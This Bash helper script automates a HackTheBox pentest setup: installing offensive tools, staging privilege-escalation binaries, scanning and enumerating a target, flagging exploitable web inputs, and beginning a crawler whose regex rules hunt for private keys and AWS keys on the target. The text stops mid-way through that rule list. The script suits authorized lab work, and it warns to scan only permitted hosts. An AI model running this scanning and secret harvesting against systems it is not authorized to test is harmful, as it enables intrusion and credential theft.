#!/usr/bin/env bash
#
# boxer.sh — HackTheBox host environment helper for Ubuntu/Debian
#
# A single script with subcommands for:
#   install    Install a core pentest toolset (apt + git + pipx)
#   tools      Clone + auto-install extra tools from a list of Git URLs
#   workspace  Scaffold a per-box working directory with notes/scan templates
#   recon      Run initial nmap + light enumeration against a target IP
#   vpn        Connect to an HTB .ovpn profile (helper)
#   doctor     Check that expected tools are present
#
# Legal note: only use this against machines you are authorized to test —
# e.g. HackTheBox lab targets, or systems you own. Unauthorized scanning is illegal.
#
# Usage:
#   ./boxer.sh install
#   ./boxer.sh tools                       # reads $TOOLS_LIST (default ~/htb/tools.txt)
#   ./boxer.sh tools <git-url> [git-url…]  # or pass URLs inline
#   ./boxer.sh workspace [box-name] [target-ip]   # prompts if omitted
#   ./boxer.sh recon <target-ip> [box-name]
#   ./boxer.sh vpn /path/to/lab.ovpn
#   ./boxer.sh doctor
#
set -euo pipefail

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
HTB_ROOT="${HTB_ROOT:-$HOME/htb}"          # base dir for all box workspaces
TOOLS_DIR="${TOOLS_DIR:-$HTB_ROOT/tools}"  # where cloned git tools live
TOOLS_LIST="${TOOLS_LIST:-$HTB_ROOT/tools.txt}"  # newline-separated git URLs
SECLISTS_DIR="/usr/share/seclists"
WORDLIST_DIRB="${SECLISTS_DIR}/Discovery/Web-Content/directory-list-2.3-medium.txt"
WORDLIST_ROCKYOU="/usr/share/wordlists/rockyou.txt"

# apt packages available in the standard Ubuntu/Debian repos
APT_PACKAGES=(
  nmap netcat-openbsd ncat socat curl wget git jq dnsutils whois
  gobuster ffuf nikto sqlmap nuclei hydra john hashcat masscan
  smbclient enum4linux ldap-utils snmp onesixtyone
  python3 python3-pip python3-venv pipx
  ruby-full openvpn openssl proxychains4 tmux xxd inotify-tools exploitdb
  metasploit-framework veil
)

# Tools installed via pipx (Python apps that are best isolated)
PIPX_PACKAGES=(
  impacket
  git+https://github.com/blacklanternsecurity/MANSPIDER   # optional smb crawler
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
c_info()  { printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok()    { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn()  { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err()   { printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }

need_root() {
  if [[ $EUID -ne 0 ]]; then
    if command -v sudo >/dev/null 2>&1; then SUDO="sudo"; else
      c_err "This action needs root and sudo is not available."; exit 1
    fi
  else SUDO=""; fi
}

have() { command -v "$1" >/dev/null 2>&1; }

# True if $1 is valid IPv4 CIDR (e.g. 10.129.92.12/32): 4 octets 0-255 + /0-32.
is_cidr() {
  [[ "$1" =~ ^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})/([0-9]|[1-2][0-9]|3[0-2])$ ]] || return 1
  local o
  for o in "${BASH_REMATCH[@]:1:4}"; do (( o <= 255 )) || return 1; done
  return 0
}

# Add "<ip>  <hostname>" to /etc/hosts, updating any stale entry for that host.
add_hosts_entry() {
  local ip="$1" host="$2"
  [[ -z "$ip" || -z "$host" ]] && return 0
  need_root
  if grep -qE "[[:space:]]${host}(\$|[[:space:]])" /etc/hosts 2>/dev/null; then
    local existing
    existing=$(grep -E "[[:space:]]${host}(\$|[[:space:]])" /etc/hosts | awk '{print $1}' | head -n1)
    if [[ "$existing" == "$ip" ]]; then
      c_ok "/etc/hosts already maps $host -> $ip"; return 0
    fi
    c_info "Updating /etc/hosts entry for $host ($existing -> $ip)"
    $SUDO sed -i.bak -E "/[[:space:]]${host}(\$|[[:space:]])/d" /etc/hosts
  fi
  echo "${ip}  ${host}" | $SUDO tee -a /etc/hosts >/dev/null \
    && c_ok "/etc/hosts: added '${ip}  ${host}'" \
    || c_warn "could not write /etc/hosts (need root?)"
}

# ---------------------------------------------------------------------------
# install
# ---------------------------------------------------------------------------
cmd_install() {
  need_root
  c_info "Updating apt package lists..."
  $SUDO apt-get update -y

  c_info "Installing core packages via apt..."
  # Install one-by-one so a single missing package doesn't abort everything.
  for pkg in "${APT_PACKAGES[@]}"; do
    if $SUDO apt-get install -y "$pkg" >/dev/null 2>&1; then
      c_ok "apt: $pkg"
    else
      c_warn "apt: could not install '$pkg' (skipping — may have a different name on your release)"
    fi
  done

  # SecLists — big wordlist collection, not always in apt
  if [[ ! -d "$SECLISTS_DIR" ]]; then
    c_info "Cloning SecLists into $SECLISTS_DIR (this is large)..."
    $SUDO git clone --depth 1 https://github.com/danielmiessler/SecLists.git "$SECLISTS_DIR" \
      && c_ok "SecLists installed" \
      || c_warn "SecLists clone failed"
  else
    c_ok "SecLists already present"
  fi

  # rockyou — decompress if only the .gz ships
  if [[ ! -f "$WORDLIST_ROCKYOU" && -f "${WORDLIST_ROCKYOU}.gz" ]]; then
    c_info "Decompressing rockyou.txt..."
    $SUDO gunzip -k "${WORDLIST_ROCKYOU}.gz" && c_ok "rockyou.txt ready"
  fi

  # searchsploit / Exploit-DB — not always in Ubuntu apt; fall back to git.
  if ! have searchsploit; then
    c_info "Installing Exploit-DB (searchsploit) from git..."
    if $SUDO git clone --depth 1 https://gitlab.com/exploit-database/exploitdb.git /opt/exploitdb >/dev/null 2>&1; then
      $SUDO ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
      c_ok "searchsploit installed (/opt/exploitdb)"
    else
      c_warn "Could not install exploitdb — 'exploits' command will be unavailable."
    fi
  else
    c_ok "searchsploit already present"
  fi

  # pipx-managed Python tooling
  if have pipx; then
    pipx ensurepath >/dev/null 2>&1 || true
    for p in "${PIPX_PACKAGES[@]}"; do
      if pipx install "$p" >/dev/null 2>&1; then
        c_ok "pipx: $p"
      else
        c_warn "pipx: could not install '$p' (may already be installed)"
      fi
    done
  else
    c_warn "pipx not available; skipping Python tool install"
  fi

  # pyftpdlib powers the anonymous FTP delivery server ('ftp' command).
  if pip3 install --break-system-packages pyftpdlib >/dev/null 2>&1; then
    c_ok "pip: pyftpdlib (FTP delivery server)"
  else
    c_warn "pip: could not install pyftpdlib — the 'ftp' command will be unavailable"
  fi

  # Pull + install any extra Git tools listed in $TOOLS_LIST (e.g. AutoRecon)
  if [[ -f "$TOOLS_LIST" ]]; then
    c_info "Found tool list at $TOOLS_LIST — installing Git tools..."
    cmd_tools || c_warn "some Git tools failed; see output above"
  else
    c_info "No $TOOLS_LIST found; skipping Git tools. (Create it or run './boxer.sh tools <url>'.)"
  fi

  # Fetch precompiled winPEAS/linPEAS binaries (not in the git repo) for delivery.
  c_info "Fetching precompiled PEASS binaries (winPEAS/linPEAS)..."
  cmd_peass || c_warn "PEASS binary fetch failed; run './boxer.sh peass' later"

  c_ok "Install phase complete. Run './boxer.sh doctor' to verify."
}

# ---------------------------------------------------------------------------
# doctor — verify tooling
# ---------------------------------------------------------------------------
cmd_doctor() {
  local tools=(nmap ffuf gobuster nikto sqlmap nuclei hydra john hashcat \
               smbclient nc curl python3 pipx openvpn proxychains4 tmux jq searchsploit msfvenom)
  local missing=0
  c_info "Checking installed tools..."
  for t in "${tools[@]}"; do
    if have "$t"; then c_ok "$t"; else c_warn "missing: $t"; missing=$((missing+1)); fi
  done
  [[ -d "$SECLISTS_DIR" ]] && c_ok "SecLists present" || c_warn "SecLists missing"
  [[ -f "$WORDLIST_ROCKYOU" ]] && c_ok "rockyou.txt present" || c_warn "rockyou.txt missing"
  if [[ $missing -eq 0 ]]; then c_ok "All core tools present."; else
    c_warn "$missing tool(s) missing — re-run './boxer.sh install'."
  fi
}

# ---------------------------------------------------------------------------
# tools — clone + auto-install tools from Git URLs
# ---------------------------------------------------------------------------
# Reads URLs from (in priority order):
#   1) URLs passed as arguments
#   2) $TOOLS_LIST file (default ~/htb/tools.txt), one URL per line
# Lines starting with '#' and blank lines in the file are ignored.
# After cloning, it auto-detects the install method for each repo.
install_one_repo() {
  local url="$1"
  # derive repo name, strip trailing .git
  local name; name="$(basename "$url")"; name="${name%.git}"
  local dest="$TOOLS_DIR/$name"

  if [[ -d "$dest/.git" ]]; then
    c_info "Updating existing: $name"
    git -C "$dest" pull --ff-only >/dev/null 2>&1 || c_warn "pull failed for $name (local changes?)"
  else
    c_info "Cloning: $url"
    if ! git clone --depth 1 "$url" "$dest" >/dev/null 2>&1; then
      c_err "clone failed: $url"; return 1
    fi
  fi
  c_ok "Fetched $name -> $dest"

  # --- auto-detect install method (best-effort, non-fatal) ---
  (
    cd "$dest" || exit 0
    if [[ -f "pyproject.toml" ]] && have pipx; then
      c_info "$name: pyproject.toml -> pipx install ."
      pipx install . >/dev/null 2>&1 && c_ok "$name installed via pipx" || c_warn "$name pipx install skipped/failed"
    elif [[ -f "setup.py" ]] && have pipx; then
      c_info "$name: setup.py -> pipx install ."
      pipx install . >/dev/null 2>&1 && c_ok "$name installed via pipx" || c_warn "$name pipx install skipped/failed"
    elif [[ -f "requirements.txt" ]]; then
      c_info "$name: requirements.txt -> venv"
      python3 -m venv .venv >/dev/null 2>&1 || true
      # shellcheck disable=SC1091
      if [[ -f .venv/bin/activate ]]; then
        . .venv/bin/activate
        pip install -r requirements.txt >/dev/null 2>&1 && c_ok "$name deps installed (venv: $dest/.venv)" || c_warn "$name pip install had errors"
        deactivate 2>/dev/null || true
      fi
    elif [[ -f "go.mod" ]] && have go; then
      c_info "$name: go.mod -> go build"
      go build ./... >/dev/null 2>&1 && c_ok "$name built (go)" || c_warn "$name go build failed"
    elif [[ -f "Makefile" || -f "makefile" ]]; then
      c_info "$name: Makefile -> make"
      make >/dev/null 2>&1 && c_ok "$name built (make)" || c_warn "$name make failed"
    elif compgen -G "*.sh" >/dev/null || find . -maxdepth 2 -name '*.sh' | grep -q .; then
      # Script-only repos (e.g. PEASS-ng/linPEAS): nothing to build — just make runnable.
      find . -maxdepth 3 -name '*.sh' -exec chmod +x {} + 2>/dev/null || true
      local found
      found=$(find . -maxdepth 3 -iname 'linpeas.sh' -o -iname 'winpeas*.bat' -o -iname 'winpeas*.exe' 2>/dev/null | head -n3)
      if [[ -n "$found" ]]; then
        c_ok "$name: scripts ready ->"; while IFS= read -r f; do [[ -n "$f" ]] && echo "        $dest/${f#./}"; done <<<"$found"
      else
        c_ok "$name: shell scripts made executable — run from $dest"
      fi
    else
      c_warn "$name: no recognized install method — cloned only, inspect $dest"
    fi
  )
}

cmd_tools() {
  if ! have git; then c_err "git not installed. Run './boxer.sh install'."; exit 1; fi
  mkdir -p "$TOOLS_DIR"

  local urls=()
  if [[ $# -gt 0 ]]; then
    urls=("$@")
  elif [[ -f "$TOOLS_LIST" ]]; then
    c_info "Reading tool list from $TOOLS_LIST"
    while IFS= read -r line; do
      line="${line%%#*}"; line="$(echo "$line" | xargs)"   # strip comments + whitespace
      [[ -n "$line" ]] && urls+=("$line")
    done < "$TOOLS_LIST"
  else
    c_warn "No URLs given and no list at $TOOLS_LIST."
    c_info "Create $TOOLS_LIST (one git URL per line) or pass URLs as arguments."
    return 0
  fi

  if [[ ${#urls[@]} -eq 0 ]]; then c_warn "Tool list is empty."; return 0; fi
  c_info "Installing ${#urls[@]} tool(s) into $TOOLS_DIR ..."
  local ok=0 fail=0
  for u in "${urls[@]}"; do
    if install_one_repo "$u"; then ok=$((ok+1)); else fail=$((fail+1)); fi
  done
  c_ok "Tools done: $ok succeeded, $fail failed. Location: $TOOLS_DIR"
}

# ---------------------------------------------------------------------------
# peass — fetch the LATEST precompiled winPEAS/linPEAS binaries from Releases
# ---------------------------------------------------------------------------
# The PEASS-ng git repo has winPEAS *source* but not the compiled winPEAS*.exe;
# those ship only as GitHub Release assets. This grabs them (plus linpeas.sh)
# into a delivery folder so they're ready to serve to a box (see 'ftp').
cmd_peass() {
  local dest="${1:-$HTB_ROOT/serve/peass}"; shift || true
  local wanted=("$@")
  if [[ ${#wanted[@]} -eq 0 ]]; then
    wanted=(winPEASx64.exe winPEASx86.exe winPEASany.exe winPEAS.bat linpeas.sh linpeas_small.sh)
  fi
  if ! have python3; then c_err "python3 required. Run './boxer.sh install'."; return 0; fi
  if ! have curl && ! have wget; then c_err "curl or wget required."; return 0; fi

  mkdir -p "$dest"
  local api="https://api.github.com/repos/peass-ng/PEASS-ng/releases/latest"
  c_info "Querying latest PEASS-ng release..."
  local json
  if have curl; then json="$(curl -fsSL -A "boxer" "$api" 2>/dev/null || true)"
  else json="$(wget -qO- --header='User-Agent: boxer' "$api" 2>/dev/null || true)"; fi
  if [[ -z "$json" ]]; then c_warn "Could not reach GitHub API — check connectivity."; return 0; fi

  # Extract "name<TAB>url" for the assets we want.
  local pairs
  pairs="$(printf '%s' "$json" | WANTED="${wanted[*]}" python3 -c '
import sys, os, json
try:
    data = json.load(sys.stdin)
except Exception:
    sys.exit(0)
wanted = set(os.environ["WANTED"].split())
tag = data.get("tag_name", "?")
sys.stderr.write("release: %s\n" % tag)
for a in data.get("assets", []):
    if a.get("name") in wanted:
        print(a["name"] + "\t" + a["browser_download_url"])
')"
  if [[ -z "$pairs" ]]; then c_warn "No matching assets found in the latest release."; return 0; fi

  local got=0 name url
  while IFS=$'\t' read -r name url; do
    [[ -z "$name" || -z "$url" ]] && continue
    if have curl; then curl -fsSL -o "$dest/$name" "$url" 2>/dev/null
    else wget -q -O "$dest/$name" "$url" 2>/dev/null; fi
    if [[ -s "$dest/$name" ]]; then
      [[ "$name" == *.sh ]] && chmod +x "$dest/$name" 2>/dev/null || true
      c_ok "fetched $name"; got=$((got+1))
    else
      c_warn "failed to download $name"; rm -f "$dest/$name"
    fi
  done <<< "$pairs"

  c_ok "PEASS binaries ready in: $dest  ($got file(s))"
  c_info "Deliver them with:  ./boxer.sh ftp $dest   (then pull winPEASx64.exe / linpeas.sh from the box)"
  return 0
}

# ---------------------------------------------------------------------------
# workspace — scaffold per-box directory
# ---------------------------------------------------------------------------
cmd_workspace() {
  local box="${1:-}"; local ip="${2:-}"

  # Prompt for the box name if it wasn't provided on the command line.
  if [[ -z "$box" ]]; then
    read -r -p "$(printf '\033[1;34m[?]\033[0m Enter the box name: ')" box
  fi
  # Sanitise: trim, drop slashes, and turn inner whitespace into hyphens so it's
  # a safe single-token directory name and hostname.
  box="$(echo "$box" | tr '/' '-' | awk '{$1=$1};1' | tr ' ' '-')"
  if [[ -z "$box" ]]; then c_err "A box name is required."; exit 1; fi

  # Require the target in CIDR notation — AutoRecon needs it (a bare IP fails).
  # For a single host, append /32 (e.g. 10.129.92.12/32).
  if [[ -z "$ip" ]]; then
    read -r -p "$(printf '\033[1;34m[?]\033[0m Enter the box IP in CIDR notation (e.g. 10.129.92.12/32): ')" ip
  fi
  while ! is_cidr "$ip"; do
    [[ -n "$ip" ]] && c_warn "'$ip' is not valid CIDR. AutoRecon requires it — append /32 for a single host (e.g. 10.129.92.12/32)."
    read -r -p "$(printf '\033[1;34m[?]\033[0m Box IP in CIDR (e.g. 10.129.92.12/32): ')" ip \
      || { c_err "IP must be in CIDR notation (e.g. 10.129.92.12/32)."; exit 1; }
  done
  local ip_cidr="$ip"     # full CIDR — passed to AutoRecon
  ip="${ip%/*}"           # plain IP — used for /etc/hosts, URLs, notes, nmap

  # Add the box to /etc/hosts as <ip> <box>.htb so vhosts resolve.
  add_hosts_entry "$ip" "${box}.htb"

  local dir="${HTB_ROOT}/${box}"
  mkdir -p "$dir"/{nmap,enum,exploit,loot,www}
  c_ok "Created workspace: $dir"

  # notes template
  if [[ ! -f "$dir/notes.md" ]]; then
    cat > "$dir/notes.md" <<EOF
# ${box}

- Target IP: ${ip}
- AutoRecon target (CIDR): ${ip_cidr}
- Date started: $(date +%Y-%m-%d)

## Ports / Services
| Port | Service | Version | Notes |
|------|---------|---------|-------|
|      |         |         |       |

## Enumeration
-

## Foothold
- Initial access vector:
- User flag:

## Privilege Escalation
- Vector:
- Root flag:

## Credentials found
| User | Password/Hash | Source |
|------|---------------|--------|
|      |               |        |

## Loose ends / rabbit holes
-
EOF
    c_ok "notes.md template written"
  fi

  # per-box recon shortcut
  cat > "$dir/run-recon.sh" <<EOF
#!/usr/bin/env bash
# Convenience wrapper: recon this box.
exec "$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)/boxer.sh" recon "${ip}" "${box}" 2>/dev/null || \\
exec boxer.sh recon "${ip}" "${box}"
EOF
  chmod +x "$dir/run-recon.sh" 2>/dev/null || true

  c_info "Workspace ready. cd ${dir}  (host: ${box}.htb -> ${ip})"

  # Offer to kick off AutoRecon against the box right away (uses the CIDR target).
  if [[ -n "$ip_cidr" ]]; then
    local ans
    read -r -p "$(printf '\033[1;34m[?]\033[0m Run AutoRecon against %s now? [y/N]: ' "$ip_cidr")" ans
    case "${ans,,}" in
      y|yes) run_autorecon "$ip" "$dir" "$ip_cidr" ;;
      *) c_info "Skipping AutoRecon. Run it later with:  ./boxer.sh recon ${ip} ${box}" ;;
    esac
  fi
}

# ---------------------------------------------------------------------------
# analyze_web_page — fetch one URL and flag exploitation-relevant elements
# ---------------------------------------------------------------------------
# Writes human-readable findings to $report. Detects file-upload inputs,
# login/username-password forms, POST forms, and other interesting handlers.
analyze_web_page() {
  local url="$1" report="$2"
  local html
  html=$(curl -sk -L --max-time 12 -A "Mozilla/5.0 htb-recon" "$url" 2>/dev/null) || return 0
  [[ -z "$html" ]] && return 0

  local hits=()
  # --- file upload ---
  if grep -qiE 'type=["'"'"']?file|enctype=["'"'"']?multipart/form-data' <<<"$html"; then
    hits+=("FILE UPLOAD: form accepts file uploads (type=file / multipart) -> test unrestricted upload / webshell")
  fi
  # --- login / credential entry ---
  if grep -qiE 'type=["'"'"']?password' <<<"$html"; then
    hits+=("LOGIN FORM: password field present -> test default/weak creds, SQLi auth bypass, brute force")
  elif grep -qiE 'name=["'"'"']?(user(name)?|email|login|uid)["'"'"']?' <<<"$html"; then
    hits+=("USERNAME FIELD: user/email input present (possible auth or user-enum surface)")
  fi
  # --- generic POST forms (data submission = potential injection) ---
  if grep -qiE '<form[^>]*method=["'"'"']?post' <<<"$html"; then
    local action
    action=$(grep -oiE '<form[^>]*action=["'"'"'][^"'"'"']*' <<<"$html" | sed -E 's/.*action=["'"'"']//' | head -n3 | paste -sd', ' -)
    hits+=("POST FORM: data-submission form(s) -> test SQLi / command injection / SSTI  ${action:+(action: $action)}")
  fi
  # --- other exploitable handlers ---
  grep -qiE 'name=["'"'"']?(cmd|command|exec|ping|query|search|url|redirect|file|path|page|include)["'"'"']?' <<<"$html" \
    && hits+=("SUSPICIOUS PARAM: input names hint at RCE/LFI/SSRF/redirect surface")
  grep -qiE 'enctype=["'"'"']?multipart|<input[^>]*capture' <<<"$html" && : # covered above
  grep -qiE 'action=["'"'"'][^"'"'"']*\.(php|asp|aspx|jsp|cgi|py)' <<<"$html" \
    && hits+=("SERVER SCRIPT: form posts to a server-side script (php/asp/jsp/cgi/py)")

  if [[ ${#hits[@]} -gt 0 ]]; then
    {
      echo "=================================================================="
      echo "[$(date +%H:%M:%S)] $url"
      for h in "${hits[@]}"; do echo "   -> $h"; done
    } >> "$report"
    c_ok "web surface: findings at $url  (${#hits[@]}) -> $report"
  fi
}

# ---------------------------------------------------------------------------
# web_surface_watch — while AutoRecon runs, harvest discovered URLs and analyze
# ---------------------------------------------------------------------------
# Args: <ip> <autorecon-outdir> <report-file> [pid-to-follow]
web_surface_watch() {
  local ip="$1" outdir="$2" report="$3" follow_pid="${4:-}"
  local box_host="${5:-}"
  local seen="${report}.seen"
  : > "$report"; : > "$seen"

  cat > "$report" <<EOF
# Web attack-surface report for $ip
# Generated live alongside AutoRecon. Flags pages with exploitable input methods.
# Only for authorized targets (HTB / your own).

EOF

  # Seed candidate URLs: common web ports on the IP (and hostname, if any).
  local seeds=() hosts=("$ip")
  [[ -n "$box_host" ]] && hosts+=("$box_host")
  local h
  for h in "${hosts[@]}"; do
    seeds+=("http://$h/" "http://$h:8080/" "http://$h:8000/" "https://$h/" "https://$h:8443/")
  done

  analyze_batch() {
    local u
    for u in "$@"; do
      [[ -z "$u" ]] && continue
      grep -qxF "$u" "$seen" 2>/dev/null && continue
      echo "$u" >> "$seen"
      analyze_web_page "$u" "$report"
    done
  }

  c_info "Web attack-surface watcher started -> $report"
  analyze_batch "${seeds[@]}"

  # Loop while AutoRecon is alive, harvesting any URLs it discovers.
  local rounds=0
  while :; do
    # URLs AutoRecon logged into its scan output (feroxbuster/gobuster/curl/etc.)
    if [[ -d "$outdir" ]]; then
      mapfile -t found < <(grep -rhoE 'https?://[^ "'"'"'<>()]+' "$outdir" 2>/dev/null \
                            | sed 's/[.,)]*$//' | sort -u)
      [[ ${#found[@]} -gt 0 ]] && analyze_batch "${found[@]}"
    fi
    # stop conditions: followed PID gone, or ~15 min cap if no PID
    if [[ -n "$follow_pid" ]]; then
      kill -0 "$follow_pid" 2>/dev/null || break
    else
      rounds=$((rounds+1)); [[ $rounds -ge 60 ]] && break
    fi
    sleep 15
  done

  # Final harvest pass after AutoRecon completes.
  if [[ -d "$outdir" ]]; then
    mapfile -t found < <(grep -rhoE 'https?://[^ "'"'"'<>()]+' "$outdir" 2>/dev/null | sed 's/[.,)]*$//' | sort -u)
    [[ ${#found[@]} -gt 0 ]] && analyze_batch "${found[@]}"
  fi

  rm -f "$seen"
  if [[ -s "$report" ]] && grep -q '=====' "$report"; then
    c_ok "Web attack-surface report ready: $report"
  else
    c_info "No obvious web input methods found (see $report)."
  fi
}

# ---------------------------------------------------------------------------
# run_autorecon — launch AutoRecon against a target, output into workspace
# ---------------------------------------------------------------------------
run_autorecon() {
  # $1 = plain IP (used for web/secrets/URLs); $3 = AutoRecon target in CIDR
  # (falls back to the plain IP if not supplied).
  local ip="$1" dir="${2:-$PWD}" ar_target="${3:-$1}"
  # Locate the autorecon binary (pipx install) or the cloned repo entrypoint.
  local ar=""
  if have autorecon; then
    ar="autorecon"
  elif [[ -x "$TOOLS_DIR/AutoRecon/src/autorecon/main.py" ]]; then
    ar="python3 $TOOLS_DIR/AutoRecon/src/autorecon/main.py"
  elif [[ -f "$TOOLS_DIR/AutoRecon/autorecon.py" ]]; then
    ar="python3 $TOOLS_DIR/AutoRecon/autorecon.py"
  fi

  if [[ -z "$ar" ]]; then
    c_warn "AutoRecon not found. Install it first:  ./boxer.sh install   (or  ./boxer.sh tools https://github.com/Tib3rius/AutoRecon )"
    c_info "Falling back to built-in recon..."
    cmd_recon "$ip" "$(basename "$dir")"
    return 0
  fi

  local out="$dir/autorecon"
  mkdir -p "$out"
  local box_host; box_host="$(basename "$dir").htb"
  local web_report="$dir/web-attack-surface.txt"
  c_warn "Only scan hosts you are authorized to test (HTB labs / your own systems)."
  c_info "Launching AutoRecon against ${ar_target} -> output in $out  (this can take a while)"

  # Start AutoRecon in the background so the web analyzer can run alongside it.
  # AutoRecon is given the CIDR target ($ar_target); web/secrets use the plain IP.
  if [[ $EUID -ne 0 ]] && have sudo; then
    ( sudo $ar -o "$out" "$ar_target" ) &
  else
    ( $ar -o "$out" "$ar_target" ) &
  fi
  local ar_pid=$!

  # Run the web attack-surface watcher in parallel; it follows AutoRecon's PID
  # and reports exploitable input methods (uploads, logins, POST forms) as it
  # discovers URLs. Requires curl.
  if have curl; then
    web_surface_watch "$ip" "$out" "$web_report" "$ar_pid" "$box_host"
  else
    c_warn "curl missing — skipping live web attack-surface analysis."
  fi

  wait "$ar_pid" 2>/dev/null && c_ok "AutoRecon finished." || c_warn "AutoRecon exited non-zero — check $out"

  # Final deep pass: now that AutoRecon has discovered URLs, hunt for secrets.
  if have python3; then
    c_info "Running secret scan over discovered web content..."
    cmd_secrets "$ip" "$(basename "$dir")" || true
  fi

  # And match the fingerprinted services to known exploits.
  if have searchsploit; then
    c_info "Checking fingerprinted services against Exploit-DB..."
    cmd_exploits "$(basename "$dir")" || true
  else
    c_info "(install exploitdb to auto-check services against known exploits)"
  fi

  c_ok "Results in $out — web:$web_report — secrets:${dir}/secrets-report.txt — exploits:${dir}/exploits-report.txt"
}

# ---------------------------------------------------------------------------
# recon — initial nmap + light enumeration
# ---------------------------------------------------------------------------
cmd_recon() {
  local ip="${1:-}"; local box="${2:-target}"
  if [[ -z "$ip" ]]; then c_err "Usage: $0 recon <target-ip> [box-name]"; exit 1; fi
  if ! have nmap; then c_err "nmap not installed. Run './boxer.sh install'."; exit 1; fi

  local out="${HTB_ROOT}/${box}/nmap"
  mkdir -p "$out"
  c_warn "Only scan hosts you are authorized to test (HTB labs / your own systems)."
  c_info "Recon target: $ip  ->  output in $out"

  # 1) Fast full TCP port sweep
  c_info "Stage 1: fast all-ports TCP sweep..."
  nmap -p- --min-rate 2000 -T4 -Pn "$ip" -oG "$out/allports.gnmap" -oN "$out/allports.txt" || true

  # Extract open ports from the greppable output
  local ports
  ports=$(grep -oP '\d+/open' "$out/allports.gnmap" 2>/dev/null | cut -d/ -f1 | paste -sd, - || true)

  if [[ -z "$ports" ]]; then
    c_warn "No open TCP ports found in stage 1 (host may be down, filtered, or VPN not connected)."
    return 0
  fi
  c_ok "Open ports: $ports"

  # 2) Service/version + default scripts on the open ports
  c_info "Stage 2: service + version detection on open ports..."
  nmap -sC -sV -p "$ports" -Pn "$ip" -oN "$out/services.txt" -oX "$out/services.xml" || true

  # 3) Light web enumeration if common web ports are open
  if grep -qE '(^|,)(80|443|8080|8000|8443)(,|$)' <<<"$ports"; then
    local scheme host_port
    if grep -qE '(^|,)443(,|$)' <<<"$ports"; then scheme="https"; host_port="443"; else scheme="http"; host_port="80"; fi
    c_info "Stage 3: web detected — running nikto + directory brute force ($scheme)..."
    if have nikto; then
      nikto -host "${scheme}://${ip}:${host_port}" -output "$out/nikto.txt" >/dev/null 2>&1 || true
      c_ok "nikto -> $out/nikto.txt"
    fi
    if have ffuf && [[ -f "$WORDLIST_DIRB" ]]; then
      ffuf -u "${scheme}://${ip}:${host_port}/FUZZ" -w "$WORDLIST_DIRB" \
           -mc 200,204,301,302,307,401,403 -o "$out/ffuf.json" -of json >/dev/null 2>&1 || true
      c_ok "ffuf -> $out/ffuf.json"
    else
      c_warn "ffuf or wordlist missing — skipping directory brute force."
    fi
  fi

  # 4) SMB peek if 139/445 open
  if grep -qE '(^|,)(139|445)(,|$)' <<<"$ports"; then
    c_info "Stage 4: SMB detected — enumerating shares..."
    if have smbclient; then smbclient -N -L "//$ip" >"$out/smb-shares.txt" 2>&1 || true; c_ok "smb -> $out/smb-shares.txt"; fi
    if have enum4linux; then enum4linux -a "$ip" >"$out/enum4linux.txt" 2>&1 || true; c_ok "enum4linux -> $out/enum4linux.txt"; fi
  fi

  c_ok "Recon complete. Review $out and update ${HTB_ROOT}/${box}/notes.md"
}

# ---------------------------------------------------------------------------
# websurface — standalone web attack-surface analysis for a target
# ---------------------------------------------------------------------------
cmd_websurface() {
  local ip="${1:-}"; local box="${2:-target}"
  if [[ -z "$ip" ]]; then c_err "Usage: $0 websurface <target-ip> [box-name]"; exit 1; fi
  if ! have curl; then c_err "curl not installed. Run './boxer.sh install'."; exit 1; fi
  local dir="${HTB_ROOT}/${box}"; mkdir -p "$dir"
  # No PID to follow -> the watcher self-caps; also harvest any existing autorecon output.
  web_surface_watch "$ip" "$dir/autorecon" "$dir/web-attack-surface.txt" "" "${box}.htb"
}

# ---------------------------------------------------------------------------
# secrets — crawl the web surface and hunt for creds/tokens/keys/secrets
# ---------------------------------------------------------------------------
# This is the "find valuable info" job people usually want Burp for. Burp
# Community can't be scripted, so instead we crawl the target directly and
# regex-scan every response body, JS/JSON file, HTTP header, cookie, and HTML
# comment for sensitive data, then alert you and write a report.
cmd_secrets() {
  local ip="${1:-}"; local box="${2:-target}"
  if [[ -z "$ip" ]]; then c_err "Usage: $0 secrets <target-ip-or-host> [box-name]"; exit 1; fi
  if ! have python3; then c_err "python3 not installed. Run './boxer.sh install'."; exit 1; fi

  local dir="${HTB_ROOT}/${box}"; mkdir -p "$dir"
  local out="$dir/secrets-report.txt"
  local seeds="$dir/.secret_seeds"; : > "$seeds"

  # Seed the crawler with any URLs AutoRecon / websurface already discovered.
  if [[ -d "$dir/autorecon" ]]; then
    grep -rhoE 'https?://[^ "'"'"'<>()]+' "$dir/autorecon" 2>/dev/null | sed 's/[.,)]*$//' | sort -u >> "$seeds" || true
  fi

  c_warn "Only scan hosts you are authorized to test (HTB labs / your own systems)."
  c_info "Hunting for secrets on $ip (box: $box) -> $out"

  # Embedded Python crawler + secret scanner (uses only the stdlib).
  SECRETS_MAX_PAGES="${SECRETS_MAX_PAGES:-40}" SECRETS_DEPTH="${SECRETS_DEPTH:-2}" \
  python3 - "$ip" "${box}.htb" "$out" "$seeds" <<'PY'
import sys, os, re, ssl, collections
import urllib.request, urllib.parse

target   = sys.argv[1]
box_host = sys.argv[2]
outfile  = sys.argv[3]
seedfile = sys.argv[4] if len(sys.argv) > 4 else None
MAX_PAGES = int(os.environ.get("SECRETS_MAX_PAGES", "40"))
DEPTH     = int(os.environ.get("SECRETS_DEPTH", "2"))

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
UA  = "Mozilla/5.0 htb-secrets-scan"

# Which hosts we're willing to crawl (stay on the box).
allowed_hosts = set()
for h in (target, box_host):
    if h:
        allowed_hosts.add(h.lower())

# --- detection rules: (name, severity, compiled regex) --------------------
RULES = [
    ("Private key",        "CRITICAL", re.compile(r"-----BEGIN (?:RSA|EC|DSA|OPENSSH|PGP|PRIVATE) ?(?:PRIVATE )?KEY-----")),
    ("AWS access key id",  "CRITICAL", re.compile(r"AKIA[0-9A-Z]{16}")),
